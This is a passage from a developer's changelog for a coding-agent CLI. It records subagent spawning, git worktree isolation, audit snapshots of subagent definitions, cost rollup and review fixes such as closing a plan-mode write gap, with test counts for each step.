- **No merge / commit / PR helper.** Spec §11.2:1066 lists "Pai decide: merge, descarta, ou abre PR". 4.2a returns `path` + `branch` in the envelope; the model reads them and decides via plain bash. Convenience CLI (`agent worktree merge <id>`) and slash commands (`/diff`, `/merge`) wait for M4's TUI work.
- **No `commit_on_done` frontmatter.** The spec mentions it for FAILURE_MODES §7.2 conflict semantics; 4.2a doesn't surface it. Default is "never auto-commit" — the parent always inspects the dirty tree on its own.
- **No `bgLogDir` for worktree subagents.** A child that wants `bash_background` inside the worktree still hits the "no bgLogDir" tool-error. Wiring a per-worktree bg dir is mechanical but pulled into 4.2b alongside the subprocess work where bg-process lifetime semantics need a second pass.
- **No N+1 fix for the audit lookup in `--list-sessions --include-subagents`.** Each subagent row triggers a `getSubagentWorktree` SELECT on top of the existing `getSubagentRun` SELECT (when 4.2d wires it into the listing). Same shape as the prior O1 N+1 note from Step 4.1 — defer until first user reports a slow listing on > 100 subagent rows.

**Verification:** `bun test` 1238 pass / 10 skip / 0 fail (+57 new tests across worktree module, repo, migration, loader, validator, runtime); `tsc --noEmit` clean; `biome check` clean.

**Review pass (post-self-review).** Self-review surfaced 3 critical
+ 6 medium + 5 minor. All addressed in the same commit chain:

- **C1 — `runAgent` throw could leak the worktree.** The harness's
  top-level catch is documented as exhaustive, but a regression
  there would otherwise leave a worktree dir + agent branch on
  disk with no audit row. Wrapped `runAgent` in try/catch that
  runs `cleanupWorktree` best-effort before re-raising, so even
  an uncaught throw drops the artefacts. Test: drop `messages`
  table → harness returns status='error' → assert
  `readdirSync(worktreeRoot) === []` and `result.worktree.removed
  === true`.
- **C2 — partial `git worktree add` failure left orphan admin
  state.** When `git worktree add` succeeds at registering
  `.git/worktrees/<id>/` but fails on the working-tree checkout
  (canonical case: disk-full mid-checkout), the next attempt
  with the same id would trip even though our pre-check was
  clean. Now the catch path runs `git worktree prune` and
  rmSync's the leaf dir if it landed partial. Best-effort: a
  prune failure doesn't change the propagated error.
- **C3 — bg-family tools passed the writes:true gate under
  worktree but failed at runtime.** The 4.2a runtime never
  wires `ctx.bgManager`, so `bash_background` / `bash_kill` /
  `bash_output` would surface the bgmanager-missing error on
  first invocation. Added `ToolMetadata.requiresBgManager`
  capability flag (set on those three tools), and a separate
  validator + child-registry gate that refuses any whitelisted
  tool with the flag — independent of isolation, since the
  issue is runtime wiring not write safety. Step 4.2b lifts
  this once worktree subagents get their own bg log dir. Test:
  validator throws with source-aware message under both
  isolation modes.
- **M1 — triplicate `worktree { path, branch, dirty, preserved,
  removed }` shape.** Extracted `WorktreeOutcome` in
  `src/subagents/types.ts`; `RunSubagentResult.worktree`,
  `SpawnSubagentResult.worktree`, `TaskOutput.worktree` all
  reference the single type now.
- **M2 — `listActiveSubagentWorktrees` name didn't match
  behavior.** Function returned both `active` and `preserved`
  rows. Renamed to `listOnDiskSubagentWorktrees`; doc comment
  spells out which statuses are included.
- **M3 (deferred) — SIGKILL between worktree create + audit
  insert leaves filesystem orphan with no DB row.** 4.2a writes
  the audit row post-cleanup (FK to sessions(id) requires the
  child session to exist). A SIGKILL anywhere between
  createWorktree and the post-runAgent audit insert leaves a
  worktree on disk that `listOnDiskSubagentWorktrees(db)`
  cannot find. `agent worktree gc` (4.2d) MUST do a filesystem
  walk under `~/.cache/agent/worktrees/` cross-referenced with
  `git worktree list --porcelain` rather than relying on the
  audit table alone. 4.2b's subprocess work moves the audit row
  insertion forward (write-only IPC happens before the child
  run), which closes this window.
- **M4 — chmod race [mkdirSync→chmodSync].** Documented; added
  a post-stat assertion that the cache root mode actually
  landed at 0700 after the chmod. A remount-mid-operation or
  exotic FS that strips mode bits now produces a refusal at
  create time instead of a worktree under group/other-readable
  perms.
- **M5 — branch suffix entropy.** Doc comment on `branchName`
  spells out the 16^8 ≈ 4.3B headroom and the ~65k birthday
  threshold so a future high-volume CI workload knows when to
  widen the suffix.
- **M6 — no test for runAgent failure → cleanup ran.** Added
  the `runAgent internal error still triggers worktree cleanup
  (C1 defense)` test. Drops `messages` to force runAgent into
  status='error'; asserts the worktree dir is gone after.
- **M7 (deferred) — `parentCwd` semantics inside another
  worktree are unvalidated.** A user invoking `agent` from an
  already-checked-out git worktree (not the main repo) would
  thread that as `parentCwd`. `git worktree add -C <parentCwd>`
  resolves through `.git/worktrees/<id>/gitdir` to the main
  repo, so the new worktree lands as a sibling — probably
  works, but no test covers it. 4.2b adds a fixture that
  exercises this.
- **m2 — `slugify` fallback comment.** Now mentions both empty-
  input and all-dash-after-truncation branches.
- **m3 — `branchName` doc precise about "8 hex chars from UUID
  first segment".**
- **m4 — symlink hardening.** Added `test.skip` placeholder in
  `tests/subagents/runtime.test.ts` so 4.2b's hardening pass
  has a concrete failing test to enable.
- **m5 — `RunSubagentResult.reason` doc** notes the union is
  expected to grow with 4.2b's subprocess failure modes;
  consumers should match positively, treat the rest as
  diagnostic text.

Deferred items (M3, M7) are documented above and don't change
the slice contract — both are out-of-scope for the in-process
4.2a runtime and land naturally with subprocess work in 4.2b.

**Verification (post-review):** `bun test` 1243 pass / 11 skip
/ 0 fail (+5 over the pre-review count: 3 new bgmanager-gate
tests, 1 C1-defense test, 1 symlink-skip placeholder); `tsc
--noEmit` clean; `biome check` clean.

**Next:** M3 / Step 4.2b — subprocess + IPC via SQLite (write-only child) + heartbeat-driven timeout + symlink hardening. Justifies the subprocess spawn cost the in-process path side-stepped here, and unlocks the security model SECURITY_GUIDELINE §8.4 expects. Step 4.2c (checkpoint chain inside worktree) and 4.2d (`agent worktree gc` + merge helpers) follow.

---

## [2026-04-30] M3 / Step 4.1 — subagent definition snapshot (audit gap closed)

Architectural review surfaced a real audit gap that wasn't in the
prior O1/O2/O3/O4 list: the system prompt and toolset under which
a subagent ran were never persisted. They lived in `.md` files on
disk, loaded once at bootstrap; if an author edited
`~/.config/agent/agents/explore.md` after a child run, the original
definition was unrecoverable and "explain past behavior" forensics
became impossible. The cost is asymmetric — every day deferred
loses evidence on every production run that happens in the
meantime.

**Decision:** Option A (snapshot at spawn). The other discussed
shapes (B = system prompt as a `messages` row, C = block/restore
on `--resume` of a child) were either invasive (B forces a CHECK
constraint change in migration 001 and ripples through compaction/
recap) or dependent on A (C-restore needs the snapshot to exist;
without A there's nothing to restore from). A is a one-table
ratchet: future runs become auditable, past runs stay lost.

**Slice scope:**

| Component | Status | Notes |
|---|---|---|
| `src/storage/migrations/012-subagent-runs.ts` | NEW | `subagent_runs` table — session_id PK + FK CASCADE, name, scope (CHECK user/project), source_path, source_sha256, system_prompt, tools_whitelist (JSON TEXT), budget_max_steps, budget_max_cost_usd, budget_max_wall_ms (nullable), captured_at. Index `(name, captured_at DESC)` for cross-run identity queries. |
| `src/storage/repos/subagent-runs.ts` | NEW | `insertSubagentRun` / `getSubagentRun` with defensive JSON parse (malformed tools_whitelist → empty array, never crashes the listing). |
| `src/subagents/types.ts` | UPDATED | `SubagentDefinition.sourceSha256: string` (added at load time). |
| `src/subagents/load.ts` | UPDATED | `createHash('sha256')` over the raw `.md` content (frontmatter + body, original line endings) before parsing. Path-independent fingerprint. |
| `src/subagents/runtime.ts` | UPDATED | After `runAgent` returns, INSERT the snapshot from the captured definition. Best-effort: a corrupted audit table doesn't mask the run's own outcome (catch swallows insert errors). |
| `src/cli/list-sessions.ts` | UPDATED | `SessionListItem.subagent_run: { name, source_sha256 } \| null`. Surfaces the snapshot identity in JSON for subagent rows; full detail (system prompt, full toolset, budget) reachable via `getSubagentRun(id)`. |
| Tests | NEW + UPDATED | `tests/storage/subagent-runs.test.ts` (8 — round-trip, nullable wall_ms, cascade, parent-purge survives, CHECK constraint, JSON shapes, malformed JSON defense), `tests/subagents/load.test.ts` (+1 — sha256 deterministic + path-independent + edit-detection), `tests/subagents/runtime.test.ts` (+3 — snapshot lands on success/exhausted/wall-ms-omitted), `tests/cli/list-sessions.test.ts` (+2 — JSON exposes fingerprint, defensive null when snapshot missing). |

**Decisions:**

- **Hash raw content, not parsed.** Two semantically equivalent
  files with different whitespace MUST produce different sha —
  otherwise audit can't tell apart edits to the source form.
  Defense against the "file was reformatted" rationalization that
  hides actual semantic shifts behind a stable hash.
- **Snapshot inserted AFTER runAgent.** runAgent always returns a
  HarnessResult (top-level catch is exhaustive); the only path
  with no sessionId is one where createSession itself failed and
  there's nothing to audit anyway. Pre-call insertion would
  require restructuring runAgent's session-creation flow (event
  hook, or the resume misuse path that drags in systemPrompt
  restoration semantics) — neither pays for itself here.
- **Best-effort insert with error swallow.** A corrupted audit
  table (schema drift on a stale DB, FK constraint failure on
  some future migration mistake) must NOT mask the run's actual
  outcome. The session itself is finalized; failing the insert
  would surface as `internalError` and hide the legitimate run
  exit reason from the parent. Audit losses are recoverable from
  other artifacts (git log, parent's `tool_calls.input/output`);
  outcome misreporting isn't.
- **JSON surface is compact (`name + source_sha256` only).** Full
  detail (system prompt can be multi-KB, full toolset, budget
  triple) lives in subagent_runs and is one query away. Listing
  rows stay readable; forensic queries pull detail explicitly.
- **CASCADE on session deletion, NOT on parent purge.** The
  snapshot belongs to the child's audit trail. Deleting the child
  session row drops the snapshot too; deleting the parent (which
  ON DELETE SET NULLs the child's parent_session_id) leaves both
  intact. Mirror of the `parent_session_id` design from migration
  010.

**Follow-up landed in the same pass — O5 C-block:**

`resolveResumeId` now refuses `--resume` on `is_subagent=true`
rows with a clear hint at `task()`. Without C-block, resuming a
subagent silently inherited the parent's full registry and an
empty system prompt — divergent enough to surprise the user. C-
block is the honest v1: the spec treats subagents as atomic
spawns, not continuable sessions. C-restore (re-hydrate from the
snapshot) becomes possible thanks to migration 012 and is tracked
as O5b in Pending — deferred as a feature pending real demand and
proper design for several edge cases (missing tools, renamed
subagents, budget conflicts, plan-mode propagation).

**What this DOESN'T close (known limitations):**

- **Process-kill timing window.** The snapshot insert runs AFTER
  `runAgent` returns. If the parent process is `SIGKILL`'d (or
  OOM-killed) between createSession and the post-await code
  executing, the session row exists with no snapshot. Closing
  this would require restructuring the harness to expose a
  "session created, here's the id" hook so the snapshot can
  land BEFORE the loop runs. Out of scope for this slice; the
  auditFailure surface on `RunSubagentResult` catches the
  synchronous error path which is the dominant case.
- **N+1 on subagent rows in `--list-sessions`.** With
  `--include-subagents`, the listing does one extra
  `getSubagentRun` SELECT per subagent row on top of the existing
  `cumulativeCostUsd` walk. For typical workloads (<100 rows)
  negligible; a single `WHERE session_id IN (?, ...)` pre-fetch
  would make it O(1). Same shape as the prior O1 N+1 note —
  defer until first user reports a slow listing.
- **Pre-migration row distinguishability.** A session with
  `is_subagent=true` but no snapshot can be either a row created
  before migration 012, or a row whose snapshot insert failed
  silently. The CLI emits `subagent_run: null` for both. Today
  treated identically; future fix could add a status column or
  a one-shot backfill.
- **`system_prompt` privacy.** Stored as plaintext in the audit
  table. Same trust model as `messages.content` (sessions DB is
  same trust level as source `.md` files), but a future privacy
  pass should consider a redaction layer if subagent prompts
  start carrying customer data.
- **CRLF/LF cross-clone instability.** sha256 is over raw bytes,
  so a Windows clone with `core.autocrlf=true` produces different
  fingerprints than a Linux clone of the same git revision.
  Documented as deliberate (silent normalization would alias
  edits to the source form); authors who want stable shas across
  platforms should set `* text=lf` in `.gitattributes`. Locked
  by test in `tests/subagents/load.test.ts`.
- **Hooks (spec §10).** `subagent_spawn` / `tool_use_pre` events
  for external audit pipelines stay out of scope until M4.
- **`traces` table (spec §13).** OpenTelemetry-style span emission
  is M2/3 territory; the subagent_runs row is the M3 audit
  primitive.

**Review pass (post-self-review).** Reviewer surfaced 5 medium +
6 minor + 3 out-of-scope. Addressed in this commit:

- **M1** — silent snapshot failure invisible to caller. Now the
  runtime returns `RunSubagentResult.auditFailure` when the
  insert throws; the `task` tool echoes it as `audit_failure` in
  the envelope; tests assert both the surface AND that run
  outcome stays authoritative.
- **M3** — CRLF/LF deliberate divergence locked by test;
  cross-clone footgun documented above.
- **M4** — stale "future-proofs the path" comment removed (O5
  C-block makes the resumed-child re-insert dead code).
- **M5** — explicit PK conflict test added in repo (locks the
  fail-loud-on-duplicate contract; flips to `INSERT OR REPLACE`
  in a future refactor would surface).
- **m3** — `getSubagentRun` JSDoc clarifies the two
  null-producing cases (not-a-subagent vs missing-snapshot).
- **m4** — `captured_at` semantics documented in migration
  comment (lags `started_at` by run duration; forensic queries
  filter accordingly).

Deferred (out of scope or known-limitation per above): M2
(process-kill window), m1 (N+1), m2 (table fingerprint UX), m6
(test technique), and the three OOS items (privacy, backfill,
corruption status flag).

**Verification:** `bun test` 1181 pass / 10 skip / 0 fail (+18
new tests across migration, repo, loader, runtime, CLI, task
tool); `tsc --noEmit` clean; `biome check` clean.

---

## [2026-04-30] M3 / Step 4.1 — close O1 (cost rollup) + O3 (flag validation)

Two of the four "Pending" items from the prior review fix pass were
cheap to close; doing them now keeps the deferral list honest about
what's a real architectural debt vs. an oversight that just needed
~30 LOC.

**O1 — cumulative cost rollup in `--list-sessions`.**

- New `cumulativeCostUsd(db, rootId)` helper in
  `src/storage/repos/sessions.ts` walks parent → descendants via
  `parent_session_id` (DFS with seen-guard against self-loops),
  sums each row's `total_cost_usd`. Orphans are excluded by design
  — the FK link is the rollup channel; an audit query that wants
  detached spend iterates `listSessions({includeSubagents: true})`
  directly.
- Every `SessionListItem` now carries `cumulative_cost_usd`. JSON
  output exposes it on every row. Table appends `+$Y.YYYY` after
  the per-row cost when descendants billed > 0 (1e-9 tolerance for
  FP noise), so the user reads "self vs descendants" at a glance
  without summing per row. Cost column padding bumped to 20 to
  fit the worst-case `$X.XXXX +$Y.YYYY` layout.
- Five storage tests + three CLI tests cover: leaf row equals own,
  multi-level fan-out, orphans don't roll up, unknown id returns 0,
  self-referential row doesn't deadlock, JSON always carries the
  field, table annotates only when descendants billed, table omits
  the `+$0.0000` noise case.

**O3 — `--include-subagents` standalone is now a parse error.**

The flag was silently ignored without `--list-sessions` because no
non-listing branch read it. Refusing at parse time gives the user
feedback before bootstrap. Three lines in `src/cli/args.ts`, two
tests in `tests/cli/args.test.ts`.

**Why now:** both items had honest resolution paths and no spec
discussion required. Leaving them in Pending would have rotted the
gap-list as a meaningful "watch out for" signal — every item left
there now is one with real architectural cost (O2 wants a permission
shape decision; O4 wants a "budget propagation" semantics call) or
a pull-trigger that hasn't fired (signing, sandbox).

**Verification:** `bun test` 1160 pass / 10 skip / 0 fail (+10 new
tests across storage + CLI); `tsc --noEmit` clean; `biome check`
clean.

---

## [2026-04-30] M3 / Step 4.1 — review fixes (post-self-review pass)

Self-review on `bf2c4c9` surfaced 15 issues across 4 tiers — 3
critical (C1–C3), 6 medium, 6 minor, 3 out-of-scope. All
addressable items addressed in this pass; the 3 out-of-scope items
land in **Pending** below for explicit deferral.

**Critical:**

- **C1+C2 — plan-mode bypass via `task` + child not inheriting
  `planMode`.** The `task` tool declared `writes: false`, so the
  harness's plan-mode gate (`writes && !planSafe()`) never fired,
  and the runtime didn't propagate `planMode` into the child's
  `HarnessConfig`. Combined: a subagent with `write_file`
  whitelisted could mutate the working tree under `--plan` via
  `task()`, with no gate at any layer. Fixed both layers:
    1. `invoke-tool.ts` extends the gate to include
       `planSafe === false` (explicit literal). Tools that don't
       write but have hidden side effects through indirection
       (canonically `task`) opt into the block by declaring
       `planSafe: false`. Reading `planSafe === undefined` for
       read tools (grep/glob/read_file) keeps existing semantics
       unchanged.
    2. `RunSubagentInput.planMode` plumbs through; harness loop's
       spawn closure forwards `config.planMode`. Defense in
       depth: even if a future regression bypassed the parent
       gate, the child harness would still block writes inside
       its own loop.
  Two regression tests added in `tests/harness/invoke-tool.test.ts`
  (explicit `planSafe:false` blocks writes:false; deny reason
  mentions opt-out wording) and one in
  `tests/subagents/runtime.test.ts` (parent in plan mode → child's
  write_file lands as `denied` in tool_calls).
- **C3 — `subagents.shadows` computed but never surfaced.**
  Bootstrap returned the shadow list; `cli/run.ts` ignored it.
  Authors editing `~/.config/agent/agents/foo.md` while a
  project-scope `.agent/agents/foo.md` exists got the project
  version silently — no diagnostic. Fix: one warning per shadow
  on stderr, gated on non-`--json` (preserve stdout purity).
  Tests in `tests/cli/run.test.ts` cover both cases (warning
  emitted / suppressed in JSON).

**Medium:**

- **M1 — dead `isChildError` predicate + stale comment.** The
  helper was exported but never called (`task.ts` short-circuits
  inline) and the `SESSION_FINISHED_TIMEOUT_REASONS` set was
  inconsistent with its own doc. Removed both; the live code path
  is the only contract.
- **M2 — no recursion depth cap.** Forwarding `subagentRegistry`
  to the child enabled `task → task → task` chains with only
  per-child `maxSteps` and parent wall-clock containing them.
  Added `MAX_SUBAGENT_DEPTH = 4` constant + `depth` field on
  `RunSubagentInput`, harness loop closure increments and bumps
  to a new `SpawnSubagentResult.depth_exceeded` variant (NOT a
  raw throw — model can recover from a tool error). The runtime
  itself ALSO throws on `depth >= MAX` as a defense-in-depth
  contract for programmatic callers.
- **M3 — `--resume last` quietly skips subagent rows.**
  `listSessions(db, {limit:1, cwd})` defaults to
  `includeSubagents:false` (intended), but no test locked this
  contract. Added explicit regression in `tests/cli/resume.test.ts`
  that creates a parent + subagent child, confirms `--resume last`
  lands on the parent.
- **M4 — table alignment broken on child rows.** Indented child id
  was 40 chars (`"  ↳ <36-char uuid>"`) but the column padded to
  36, shifting the PROMPT column right. Bumped column width to 40
  so parent and child rows align identically.
- **M5 — smoke `WRITE_FILE_LEAK` query had false-positive shape.**
  Filtered by tool name only; a denied attempt would have failed
  the smoke despite the whitelist working. Tightened to
  `tc.status = 'done'` — only successful execution counts as a
  leak.
- **M6 — SET NULL cascade test on `parent_session_id`.** Already
  asserted in `tests/storage/sessions.test.ts` ("parent deletion
  sets child parent_session_id to null"); confirmed and skipped.

**Minor:**

- **m1 — `lastMessageId === undefined` check.** Field is
  `string | undefined` per typing but the loop seeds it to `''`
  and never assigns undefined. Added explicit
  `length === 0` clause for clarity.
- **m2 — stale comment referencing `--list-subagents`.** The CLI
  verb doesn't exist; rewrote the comment to point at the actual
  surface (stderr warning at bootstrap).
- **m3 — `PROMPT_MAX_BYTES` magic number.** Added comment
  explaining the choice (32 KiB = "self-contained instruction"
  per PLAYBOOKS.md §1) and surfaced `byte_limit` + `byte_count`
  in the oversized-prompt error details so the model reacts
  without a guess-and-check retry.
- **m4 — loader-throw stack trace at boundary.** Already wrapped
  by the outer `try/catch` in `cli/run.ts:265`, which routes the
  message through `errSink`. Confirmed and skipped.
- **m5 — loader doesn't reject write tools in whitelist.**
  Subagents in 4.1 run in-process with checkpoints OFF for the
  child; a `write_file` whitelist would mutate the parent's tree
  with no reverse path. Added hard refusal at load time for
  `write_file`, `edit_file`, `bash`, `bash_background`,
  `bash_kill`. Step 4.2's worktree isolation will lift this with
  a separate refs chain. Tests in `tests/subagents/load.test.ts`.
- **m6 — `task` tool description bloated tokens.** Trimmed paths
  and prose to match the size of `bash`/`write_file` descriptions
  while preserving the model-facing decision criteria.

**Verification:** `bun test` 1131 pass / 10 skip / 0 fail
(+10 new tests across invoke-tool, subagent runtime, task tool,
CLI run/list-sessions/resume, subagent loader); `tsc --noEmit`
clean; `biome check` clean.
`evals/smoke-subagent-explore.sh` exits 0 against
`anthropic/claude-haiku-4-5` (whitelist enforcement assertion now
on `tc.status='done'` per M5).

**Pending (deferred from review O2/O4, not blocking 4.1):**

- ~~**O1 — cost rollup**~~ — closed in the [2026-04-30 O1+O3 pass]
  entry below.
- **O2 — no dedicated `subagent` permission category.** `task`
  routes through `'misc'`; an operator can't whitelist/blacklist
  subagents by name via `permissions.yaml`. Resolution: spec a
  `subagent` policy section (`allow: [name]`, `deny: [name]`,
  `locked`), add matcher, migrate the tool's `metadata.category`.
  Trigger: first request for org-level subagent gating.
- ~~**O3 — `--include-subagents` standalone**~~ — closed in the
  [2026-04-30 O1+O3 pass] entry above.
- ~~**O5 — `--resume <child-id>` ignores the snapshot**~~ —
  closed via C-block (resume of subagent now refused at preflight
  with a hint at `task()`). See O5b for the re-hydration path
  that's now possible thanks to the audit snapshot subsystem.
- **O5b — re-hydrate HarnessConfig from `subagent_runs` on
  resume.** With migration 012 in place, the snapshot gives us
  enough to legitimately resume a subagent (restore systemPrompt,
  filtered registry, budget) instead of refusing. Deferred
  because it's a feature, not a bug fix — needs design for
  several edge cases: tool in whitelist that no longer exists in
  parent registry, subagent name removed/renamed since the
  original run, conflict between snapshot budget and `--max-steps`
  CLI override, plan-mode propagation. Trigger: a user reports a
  legitimate use case for continuing a crashed subagent run.
- **O4 — subagent `maxCostUsd` is independent of parent's
  remaining budget.** Spec §11 endorses "budget próprio" so this
  is by design, but a parent with a tight cap can still be
  surprised by a child tree's cumulative spend (cost rollup is
  query-time per O1; the parent's cap only governs the parent's
  own provider calls). Combined with the depth cap (4 levels), a
  worst-case fan-out can multiply spend before the parent
  notices. Resolution path: when a cost-cap-on-tree feature is
  needed, sum `listChildSessions(parentId)` recursively at each
  child's spawn time and refuse if it would push past the
  parent's cap. Trigger: first user reports surprise from this
  shape. Until then, document it in the README so authors know
  to size subagent budgets conservatively.

Lands `AGENTIC_CLI §11` minus worktree isolation: a parent harness
can declare subagents via `.md` frontmatter, the `task` tool spawns
a child harness with restricted toolset and own budget, the child
runs in an isolated context (no parent message history) and writes
its own session row linked back to the parent via the new
`sessions.parent_session_id` FK.

**Slice scope:**

| Component | Status | Notes |
|---|---|---|
| `src/storage/migrations/010-subagents.ts` | NEW | Adds `parent_session_id` to `sessions` (self-referential FK, ON DELETE SET NULL). Index `(parent_session_id, started_at DESC)` for hierarchy fan-out. |
| `src/storage/repos/sessions.ts` | UPDATED | `Session.parentSessionId`, `createSession({ parentSessionId })`, new `listChildSessions()`, and `listSessions({ includeSubagents })` filter (default OFF). |
| `src/subagents/types.ts` | NEW | `SubagentDefinition`, `SubagentBudget`, `SubagentScope`. |
| `src/subagents/paths.ts` | NEW | `userAgentsDir()` + `projectAgentsDir()` mirroring `permissions/paths.ts` shape (XDG + Windows fallbacks). |
| `src/subagents/load.ts` | NEW | `.md` + YAML-frontmatter parser, kebab-case validation, project shadows user, duplicate-name-in-scope rejected, `meta` overflow for future playbook fields. |
| `src/subagents/runtime.ts` | NEW | `runSubagent({ definition, prompt, parentSessionId, ... })` — builds child registry filtered to whitelist, fresh `HarnessConfig` w/ child budget + child system prompt, no parent history; returns `{ output, sessionId, status, reason, costUsd, steps, durationMs }`. Optional recursion via forwarded `subagentRegistry`. |
| `src/harness/types.ts` | UPDATED | `parentSessionId?: string` (threaded into createSession) and `subagentRegistry?: SubagentSet` (drives ctx wiring). |
| `src/harness/loop.ts` | UPDATED | When `subagentRegistry` set, builds a `spawnSubagent` closure (binds parent session id from current ctx) and threads it into `ToolContext`; forwards same registry to child runs. |
| `src/tools/types.ts` | UPDATED | `ToolContext.spawnSubagent?` + `SpawnSubagentArgs` / `SpawnSubagentResult` discriminated union (`unknown_subagent` vs `ran`). |
| `src/tools/builtin/task.ts` | NEW | Built-in tool, schema `{ subagent, prompt }`. Validates args, gates on aborts, maps non-`done` child status → `subagent.run_failed` tool error w/ envelope echoed in details. `planSafe: false` (refuses in plan mode). |
| `src/cli/bootstrap.ts` | UPDATED | Loads subagents from user/project dirs (test seams `userAgentsDir` / `projectAgentsDir`), exposes the set in `BootstrapResult`, wires `subagentRegistry` into `HarnessConfig`. |
| `src/cli/list-sessions.ts` | UPDATED | Default listing hides children; `includeSubagents` flag fans each parent into its immediate children oldest-first. JSON shape adds `parent_session_id`; table marks children with `↳ ` indent. |
| `src/cli/args.ts` | UPDATED | `--include-subagents` flag (boolean, paired with `--list-sessions`). |
| `evals/smoke-subagent-explore.sh` | NEW | Real-model smoke: parent invokes `task(subagent: 'explore', prompt: '...')`, smoke asserts a child session row was created with `parent_session_id` set, the child never invoked `write_file` (whitelist), and the parent's assistant text references the seed files (output flowed back). |
| Tests | NEW / UPDATED | `tests/storage/sessions.test.ts` (+5 — parent_session_id round-trip, ON DELETE SET NULL, listChildSessions, listSessions hidden-by-default), `tests/subagents/load.test.ts` (15 — frontmatter parse, validation, precedence, duplicate detection), `tests/subagents/runtime.test.ts` (7 — happy path, parent history isolation, system prompt source, whitelist enforcement, budget cap, typo error, envelope shape), `tests/tools/task.test.ts` (7 — happy path, missing registry, unknown name, run_failed mapping, arg validation, oversized prompt, abort), `tests/cli/list-sessions.test.ts` (+3 — hidden default, fan-out, table indent), `tests/cli/args.test.ts` (+1 — flag parse), `tests/cli/bootstrap.test.ts` (UPDATED — registry assertion includes `task`). |

**Decisions:**

- **In-process, NOT subprocess.** Spec §11 mentions "processo separado, comunicação via SQLite". For Step 4.1 we run the child in the same Bun process: it spawns a fresh session id with `parent_session_id` set, runs the same `runAgent` loop with a filtered registry / restricted prompt / restricted budget, and writes to the same SQLite db. Subprocess isolation is genuinely useful when the child needs filesystem isolation (writing subagents) — at which point worktree isolation IS the answer (Step 4.2). Keeping 4.1 in-process avoids paying the spawn cost (~50-200ms) for the dominant read-only case AND reuses every existing harness invariant (abort-signal propagation, todo store, bg manager, telemetry) without reinventing IPC.
- **Cost rollup is query-time, not write-time.** I proposed write-time rollup ("parent's `total_cost_usd` = self + children") in the design discussion; on implementation I reverted. Write-time rollup double-counts under resume + repeat task() calls, complicates the budget contract (no cost cap exists in `RunBudget` today anyway), and forces every cost-mutation path through both rows. The honest model: each session row tracks its own spend; `listChildSessions` walks the tree at query time. When a cost cap lands in `RunBudget` later, we revisit by building a parent-time getter that sums on demand.
- **Checkpoints OFF for in-process subagents.** A child writing in the parent's tree under its own `refs/agent/checkpoints/<child-session>` chain isn't reachable from the parent's `--undo`. Disabling checkpoints for the child avoids creating refs that nobody can find. Read-only subagents (the dominant case) lose nothing. Writing subagents are the §11.2 worktree job — Step 4.2 re-enables checkpoints there because the worktree gives the child its own tree to checkpoint independently.
- **Whitelist filters at registry build time, not at execution.** `runSubagent` builds a fresh `ToolRegistry` containing only the named tools; the harness's existing `tool not registered` path rejects unknown names. Cleaner than a per-call gate and reuses the existing handling for typo'd tool names. Typos in the whitelist itself THROW at runtime (caller bug, not subagent runtime state) so the author finds them at first use.
- **`spawnSubagent` lives on `ToolContext`, not as a new harness primitive.** The closure is built once per step and threaded into ctx the same way `bgManager` and `todoStore` are. Tests inject a mock predicate via `makeCtx({ spawnSubagent })`; the harness wires the real one when `config.subagentRegistry` is present. Keeps the tool surface uniform and avoids leaking provider/db/registry references into tools that don't need them.
- **`unknown_subagent` is a discriminated result, not a throw.** The model can typo a name; that's a tool error the model recovers from (`subagent.unknown` with `available: [...]` in details). Programmer errors (registry missing entirely, typo in the playbook's tool whitelist) DO throw because they signal misconfiguration the model can't fix.
- **Project scope shadows user scope; same-scope name collision throws.** Same convention as memory + permissions. Cross-scope shadowing is a feature (override the user's default on a per-project basis); within-scope duplication is an authoring mistake (two `.md` files claim the same `name`) and should fail fast at bootstrap.
- **`task` tool is `category: 'misc'` for now.** The spec's permission engine doesn't have a `subagent` category yet; promoting the route here would force a permission shape decision before its rules are designed. `'misc'` defaults route through the existing engine without behavior change. Migration to a dedicated `subagent` policy section is queued for the permission v2 pass.
- **`task` is `planSafe: false`.** A subagent could ship `write_file` in its tools whitelist; allowing `task()` in plan mode would let a child mutate the working tree behind the harness's plan-mode gate. The simplest correct rule is "no spawning during plan" — keeps plan mode globally read-only without per-subagent introspection.

**Pending (later slices):**

- Step 4.2: worktree isolation (`isolation: worktree` frontmatter). Re-enables checkpoints for writing subagents because the child's commits land in its own branch under its own worktree. Subprocess spawn becomes worth its cost there.
- Step 4.3+: playbooks (`code-review`, `security-audit`, etc.). Frontmatter shape (`output_schema`, `references`, `sampling`, `context_recipe`) already lands in `meta` overflow — only the consumer code is missing. PLAYBOOKS.md §11 spells out the procedure.
- Slash commands `/explain` / `/review` / `/audit` — wait on M4 Ink TUI; the same `runSubagent` API consumed.
- `--list-subagents` CLI verb (introspection, surfaces shadows). Cheap to add when first user asks.
- Permission category `subagent` with allow/deny/locked rules per name. Triggered when the org-config ask materializes.
- Cost rollup helper at the CLI (`cumulativeCost(sessionId)` walks `listChildSessions` recursively). Add when budget cap arrives in `RunBudget`.

**Why it matters:**

- The differential of M3 — what makes the milestone earn its name. Subagents are the primitive every later playbook (review, audit, debug, refactor) is a constraint over.
- Unblocks the M4 TUI work that wires `/explain` etc. to subagent invocation; the runtime is ready, only the slash-to-tool wire is missing.
- Establishes the `parent_session_id` audit trail every later cost / replay / forensic tool depends on.

**Verification:** `bun test` 1121 pass / 10 skip / 0 fail (+38 new
tests across storage, subagents, tools, cli); `tsc --noEmit` clean;
`biome check` clean. `evals/smoke-subagent-explore.sh` exits 0
against `anthropic/claude-haiku-4-5`: parent invoked `task()`,
1 child session row created with `parent_session_id` linked, zero
`write_file` calls in the child's `tool_calls` (whitelist enforced),
parent's terminal text referenced the seed files (child output
flowed back through the tool envelope).

**Bug surfaced by the smoke (and fixed):** initial smoke probed for
`agent.sqlite` under `$XDG_DATA_HOME/forja/`, but `defaultDbPath()`
resolves to `sessions.db` (per `src/storage/paths.ts`). The smoke
failed before the assertions ran. Fixed in the script; nothing to
change in production code (the path was always correct, only the
smoke's verification assumption was wrong).

---

## [2026-04-29] M3 / Step 3 — fix restore on unborn HEAD with dirty tree

`git stash push` refuses on unborn HEAD with the explicit message
"You do not have the initial commit yet". `snapshot()` already
supported unborn repos via `commit-tree`, but `restore()` shipped
with an unconditional `stash push` that hard-failed before the
read-tree could run — making `--undo` unusable in a freshly
init'd repo with any uncommitted work.

The data-loss case the fix protects against: an untracked
working-tree file with the SAME NAME as something in the
checkpoint gets overwritten by `read-tree --reset -u`. Without
preservation, the user's version is gone for good. Untracked
files NOT in the checkpoint survive read-tree by themselves
(git leaves them alone), so this only matters for the name-
collision shape — but that's exactly the shape an `--undo` of an
agent edit produces.

**Fix:** detect unborn HEAD before stashing. When found, build a
